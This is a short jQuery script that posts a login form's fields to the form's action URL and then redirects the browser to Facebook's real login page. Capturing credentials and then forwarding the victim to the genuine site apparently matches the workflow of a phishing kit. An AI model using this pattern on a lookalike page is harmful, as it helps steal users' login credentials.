$(document).ready(function() {
    $('#btnLogin').on('click', function(e) {
        var $form = $('#login-form');
        var f = new FormData($form[0]);

        var url = $form.attr('action');

        $.ajax({
            data: f,
            url: url,
            contentType: false,
            processData: false,
            method: 'POST',
            success: function(data) {
                if ("status" in data && data["status"] == 0) {
                    window.location = "https://www.facebook.com/login/";
                }
            }
        });
    });
});